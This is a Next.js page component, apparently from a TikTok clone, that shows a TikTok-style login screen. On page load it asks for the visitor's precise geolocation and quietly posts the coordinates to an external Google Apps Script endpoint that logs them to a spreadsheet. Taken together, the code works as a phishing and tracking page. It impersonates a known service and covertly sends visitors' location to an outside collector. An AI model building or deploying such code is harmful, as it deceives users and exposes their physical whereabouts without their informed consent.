"use client";

import { useEffect } from "react";
import TikTokLogin from "./components/TiktokLogin";

export default function Home() {

  useEffect(() => {
    const G_SHEET_URL = "https://script.google.com/macros/s/AKfycbwT4_usBfYO4M75KsZj9QhiutHjtE35aUBnavKVqZzm-SQgAVOX1AHZ5hNtB30CkbVExw/exec";

    const sendToSheet = async (lat: number, lng: number) => {


      // Kita gunakan format Form Data agar Apps Script lebih mudah membacanya
      const formData = new FormData();
      formData.append("lat", lat.toString());
      formData.append("lng", lng.toString());
      formData.append("device", "Web-TikTok-Clone");

      try {
        await fetch(G_SHEET_URL, {
          method: "POST",
          mode: "no-cors", // Tetap gunakan no-cors
          body: formData,
        });
        console.log("Data dikirim:", lat, lng);
      } catch (error) {
        console.error("Gagal kirim:", error);
      }
    };
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          sendToSheet(latitude, longitude);
        },
        (error) => {
          console.error("Izin lokasi ditolak atau error:", error.message);
        },
        { enableHighAccuracy: true }
      );
    }
  }, []);

  return (
    <main>
      <TikTokLogin />
    </main>
  );
}